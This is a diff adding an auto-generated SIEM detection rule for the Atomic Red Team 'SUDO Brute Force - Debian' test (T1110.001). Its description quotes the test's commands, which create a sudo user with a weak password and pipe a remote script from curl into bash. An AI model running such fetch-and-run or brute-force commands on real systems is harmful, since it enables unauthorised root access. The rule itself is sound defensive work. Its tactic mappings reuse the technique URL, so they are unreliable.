@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'SUDO Brute Force - Debian' (GUID: ba1bf0b6-f32b-4db0-b7cc-d78cacc76700) of technique T1110.001 (Brute Force: Password Guessing). Test Description: An adversary may find themselves on a box (e.g. via ssh key auth, with no password) with a user that has sudo'ers privileges, but they do not know the users password. Normally, failed attempts to access root will not cause the root account to become locked, to prevent denial-of-service. This functionality enables an attacker to undertake a local brute force password guessing attack without locking out the root user. \n\nThis test creates the \\\"art\\\" user with a password of \\\"password123\\\", logs in, downloads and executes the sudo_bruteforce.sh which brute force guesses the password, then deletes the user. Command/Steps: useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art\nsu -c \\\"cd /tmp; curl -s #{remote_url} | bash\\\" art\n"
+from = "now-9m"
+rule_id = "c0e40ba7-9971-4222-ba51-79f37f3a4cd2"
+language = "kql"
+name = "Atomic Test: T1110.001 - SUDO Brute Force - Debian"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1110.001/T1110.001.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1110.001", "ba1bf0b6-f32b-4db0-b7cc-d78cacc76700", "linux",]
+type = "query"
+query = "(process.name : (\\\"sh\\\", \\\"bash\\\") OR process.parent.name : (\\\"sh\\\", \\\"bash\\\")) AND process.command_line : \\\"*useradd*\\\" AND process.command_line : \\\"*/bin/bash*\\\" AND process.command_line : \\\"*$(openssl*\\\""
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1110.001"
+name = "SUDO Brute Force - Debian"
+reference = "https://attack.mitre.org/techniques/T1110/001"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1110/001"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1110/001"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1110/001"
+
+
